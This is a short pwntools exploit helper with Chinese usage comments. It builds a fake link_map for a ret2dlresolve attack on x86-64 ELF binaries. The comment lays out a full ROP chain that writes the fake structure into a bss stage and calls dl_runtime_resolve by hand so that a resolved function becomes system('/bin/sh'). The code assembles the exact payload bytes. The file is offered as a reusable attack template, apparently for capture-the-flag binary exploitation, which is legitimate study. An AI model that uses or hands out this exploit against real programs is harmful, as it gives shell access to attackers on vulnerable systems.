from pwn import *

'''
使用说明：
理论上来讲，只要已知了libc版本就可以用这个来打
fake_linkmap_addr：可以控制的地址
known_func_ptr：function_got（已知函数的GOT表地址）
offset：system_got - function_got
l_addr =  libc.sym['system'] -libc.sym['function']  
plt_load = addr(plt[1]) # dl_runtime_resolve
fake_link_map = fake_Linkmap_payload(bss_stage, function_got ,l_addr)
payload = flat( padding, pop_rdi, 0, pop_rsi, bss_stage, 0, read_plt, pop_rsi, 0, 0, pop_rdi, bss_stage + 0x48, plt_load, bss_stage, 0)# “bss_stage+0x48”为'/bin/sh\x00'
p.recvuntil('xxxx')  
p.sendline(payload)  
p.send(fake_link_map)
利用read在“bss_stage”中写入了“fake_link_map”
手动调用dl_runtime_resolve（plt_load），把“bss_stage”和“0”作为参数
执行完成之后，目标函数就会被重定位为“ system(“/bin/sh”) ”
'''
def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    linkmap = p64(offset & (2 ** 64 - 1))
    linkmap += p64(0)
    linkmap += p64(fake_linkmap_addr + 0x18)
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1))
    linkmap += p64(0x7)
    linkmap += p64(0)
    linkmap += p64(0)
    linkmap += p64(0)
    linkmap += p64(known_func_ptr - 0x8)
    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68,b'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8,b'A')
    linkmap += p64(fake_linkmap_addr + 0x8)
    return linkmap